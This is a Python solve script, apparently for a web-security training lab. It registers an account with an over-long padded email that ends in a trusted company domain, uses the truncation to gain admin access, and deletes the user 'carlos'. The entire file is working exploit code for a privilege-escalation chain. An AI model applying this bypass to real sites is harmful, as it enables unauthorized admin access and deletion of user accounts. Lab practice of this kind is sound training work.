import re
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
admin_url = burp_url + '/admin'
register_url = burp_url + '/register'
login_url = burp_url + '/login'
confirm_url = register_url + '?temp-registration-token='
delete_url = burp_url + '/admin/delete?username=carlos'

session = requests.Session()
response = session.get(burp_url)
match = re.search(r'https://exploit-[0-9a-fA-F]+\.exploit-server\.net', response.text)
exploit_server = match.group(0)

email_client = exploit_server + '/email'

mail = "A"*238+'@' + 'dontwannacry.com.' + exploit_server[8:]
print(mail)

response = session.get(register_url)
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)

burp_data = {"csrf": csrf, "username": "aaaaaaaa", "email": mail, "password": "111111"}
session.post(register_url, data=burp_data)

response = session.get(email_client)
find_register_id = re.search(r'=([0-9a-zA-Z]{32})', response.text)
register_id = find_register_id.group(1)

session.get(confirm_url+register_id)
response = session.get(login_url)
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)

burp_data = {"csrf": csrf, "username": "aaaaaaaa", "password": "111111"}
session.post(login_url, data=burp_data)

session.get(delete_url)
